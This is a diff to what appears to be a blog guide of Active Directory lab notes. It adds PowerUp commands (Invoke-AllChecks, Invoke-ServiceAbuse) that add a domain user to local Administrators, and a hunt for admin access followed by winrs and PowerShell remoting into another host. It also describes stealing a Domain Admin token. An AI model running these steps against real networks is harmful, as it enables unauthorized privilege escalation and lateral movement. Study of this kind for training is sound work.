@@ -14,8 +14,8 @@ description: Designed to provide a comprehensive guide to Active Directory (AD) 
  
  - Hunting for Local Admin access on other machines
  - Hunting for high privilege domain accounts (like a Domain Administrator)
- - I have local admin access on a machine - A Domain Admin has a session on that machine - I steal his token and impersonate him - Profit!
-
+ - **Example Scenario :** I have local admin access on a machine **-->** A Domain Admin has a session on that machine **-->** I steal his token and impersonate him **-->** Profit!
+s
  **There are various ways of locally escalting privilege on Windows:**
  
  - Missing Patches
@@ -34,8 +34,40 @@ description: Designed to provide a comprehensive guide to Active Directory (AD) 
 
 # 2. Local Privilege Escalation by using PowerUp
 
-Check for any priviliege escalation path
+First step for local privilege escalation, we will try to check for any privilege escalation path. Then if we found any services that can be abused, we can add our domain user to the local admin group.
+
 {: .prompt-info }
 ```bash
+#Check for any priviliege escalation path
 Invoke-AllChecks
+
+#Abuse the service and add our current domain user to the local Administrator group
+Invoke-ServiceAbuse
+Invoke-ServiceAbuse -Name 'AbyssWebServer' -UserName 'dcorp\studentx' -Verbose
+```
+
+# 3. Local Privilege Escalation by using Find-PSRemotingLocalAdminAccess.ps1
+
+Next step, we will try to identify any computers/machines in the domain where our user has local administrative access. 
+
+{: .prompt-info }
+```bash
+#Identify a computer within the network domain where the user has local admin privileges.
+Find-PSRemotingLocalAdminAccess
+```
+
+We can connect to the machine who has the local administrative access by using winrs
+{: .prompt-info }
+```bash
+winrs -r:dcorp-adminsrv cmd
+
+#Checking the username and computername in the remote winrs session
+set username
+set computername
+```
+
+We can also use PowerShell Remoting
+{: .prompt-info }
+```bash
+Enter-PSSession -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local
 ```
